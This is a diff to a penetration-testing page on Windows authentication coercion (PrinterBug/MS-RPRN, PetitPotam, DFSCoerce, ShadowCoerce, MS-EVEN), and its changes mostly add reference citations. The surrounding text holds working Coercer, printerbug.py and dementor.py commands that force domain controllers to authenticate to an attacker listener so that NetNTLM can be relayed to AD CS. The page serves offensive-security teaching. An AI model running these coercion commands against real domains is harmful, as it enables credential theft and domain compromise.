@@ -11,7 +11,7 @@
 If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
 Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
 
-Under the hood, the classic **PrinterBug** primitive abuses **`RpcRemoteFindFirstPrinterChangeNotificationEx`** over **`\\PIPE\\spoolss`**. The attacker first opens a printer/server handle and then supplies a fake client name in `pszLocalMachine`, so the target spooler creates a notification channel **back to the attacker-controlled host**. This is why the effect is **outbound authentication coercion** rather than direct code execution.\
+Under the hood, the classic **PrinterBug** primitive abuses **`RpcRemoteFindFirstPrinterChangeNotificationEx`** over **`\\PIPE\\spoolss`**. The attacker first opens a printer/server handle and then supplies a fake client name in `pszLocalMachine`, so the target spooler creates a notification channel **back to the attacker-controlled host**. This is why the effect is **outbound authentication coercion** rather than direct code execution.<sup>[[2]](#references)</sup>\
 If you are looking for **RCE/LPE** in the spooler itself, check [PrintNightmare](printnightmare.md). This page is focused on **coercion and relay**.
 
 ### Finding Windows Servers on the domain
@@ -43,7 +43,7 @@ Or quickly test hosts from Linux with **NetExec/CrackMapExec**:
 nxc smb targets.txt -u user -p password -M spooler
 ```
 
-If you want to **enumerate coercion surfaces** instead of just checking whether the spooler endpoint exists, use **Coercer scan mode**:
+If you want to **enumerate coercion surfaces** instead of just checking whether the spooler endpoint exists, use **Coercer scan mode**:<sup>[[5]](#references)</sup>
 
 ```bash
 coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
@@ -67,7 +67,7 @@ python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 
-With **Coercer**, you can target the spooler interfaces directly and avoid guessing which RPC method is exposed:
+With **Coercer**, you can target the spooler interfaces directly and avoid guessing which RPC method is exposed:<sup>[[5]](#references)</sup>
 
 ```bash
 coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
@@ -101,40 +101,40 @@ If an attacker has already compromised a computer with [Unconstrained Delegation
   - Pipe: \\PIPE\\spoolss
   - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
   - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
-  - Tools: PrinterBug / SpoolSample / Coercer
+  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
 - MS-PAR (Print System Asynchronous Remote)
   - Pipe: \\PIPE\\spoolss
   - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
-  - Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
+  - Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host<sup>[[1]](#references)[[6]](#references)</sup>
 - MS-EFSR (Encrypting File System Remote Protocol)
   - Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
   - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
   - Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
-  - Tool: PetitPotam
+  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
 - MS-DFSNM (DFS Namespace Management)
   - Pipe: \\PIPE\\netdfs
   - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
   - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
-  - Tool: DFSCoerce
+  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
 - MS-FSRVP (File Server Remote VSS)
   - Pipe: \\PIPE\\FssagentRpc
   - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
   - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
-  - Tool: ShadowCoerce
+  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
 - MS-EVEN (EventLog Remoting)
   - Pipe: \\PIPE\\even
   - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
   - Opnum: 9 ElfrOpenBELW
-  - Tool: CheeseOunce
+  - Tool: CheeseOunce<sup>[[1]](#references)</sup>
 
 Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
-For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.
+For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.<sup>[[2]](#references)</sup>
 
 ### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
-- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
-- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
-- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
-- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.
+- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
+- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
+- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.<sup>[[1]](#references)</sup>
+- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.<sup>[[1]](#references)</sup>
 
 ## PrivExchange
 
@@ -214,14 +214,15 @@ If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index
 _Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
 
 ## References
-- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
-- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
-- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
-- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
-- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
-- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
-- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
-- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
-- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
+
+- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
+- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
+- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
+- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
+- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
+- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
+- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
 
 {{#include ../../banners/hacktricks-training.md}}
